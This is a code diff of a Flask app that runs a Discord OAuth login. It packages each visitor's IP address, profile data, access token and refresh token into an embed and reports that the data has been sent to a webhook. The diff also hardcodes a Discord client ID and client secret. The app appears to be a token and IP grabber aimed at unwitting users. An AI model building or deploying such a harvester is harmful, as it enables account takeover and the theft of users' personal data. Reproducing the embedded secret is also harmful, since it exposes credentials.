@@ -6,7 +6,7 @@ import requests
 base_discord_api_url = 'https://discordapp.com/api'
 client_id = '1178048620939972798'
 client_secret = "84mKESgz8NKl-wvDb8i5UGP-_b3WqQgs"
-redirect_uri = 'https://flask-production-6a75.up.railway.app/oauth_callback'
+redirect_uri = 'https://flask-production-6a75.up.railway.app/oauth_callback'  # Update with your actual domain
 scope = ['identify', 'email', 'connections']
 token_url = 'https://discordapp.com/api/oauth2/token'
 authorize_url = 'https://discordapp.com/api/oauth2/authorize'
@@ -14,6 +14,7 @@ authorize_url = 'https://discordapp.com/api/oauth2/authorize'
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
+# Function to create embed
 def create_embed(user_id, user_ip, profile_data, access_token, refresh_token, color="#00FF00"):
     embed = {
         'title': 'Discord OAuth Data',
@@ -31,7 +32,7 @@ def create_embed(user_id, user_ip, profile_data, access_token, refresh_token, co
 
 @app.route("/")
 def home():
-    oauth = OAuth2Session(client_id, redirect_uri="https://flask-production-6a75.up.railway.app/oauth_callback", scope=scope)
+    oauth = OAuth2Session(client_id, redirect_uri="https://your-domain.com/oauth_callback", scope=scope)
     login_url, state = oauth.authorization_url(authorize_url)
     
     # Store state in the session
@@ -39,7 +40,6 @@ def home():
     
     print("Login url: %s" % login_url)
     return '<a href="' + login_url + '">Login with Discord</a>'
-
 
 @app.route("/oauth_callback")
 def oauth_callback():
@@ -77,11 +77,9 @@ def oauth_callback():
         return 'Authentication successful. Your data has been sent to the webhook.'
     
     except Exception as e:
-        # Print the detailed error message
+        # Handle other exceptions here
         print(f"An error occurred: {e}")
-        return f'An error occurred during authentication. Details: {e}'
-
-
+        return 'An error occurred during authentication.'
 
 @app.route("/profile")
 def profile():
@@ -93,4 +91,4 @@ def profile():
     return 'Profile: %s' % user_id
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8000)
+    app.run(ssl_context='adhoc', host='0.0.0.0', port=8000)
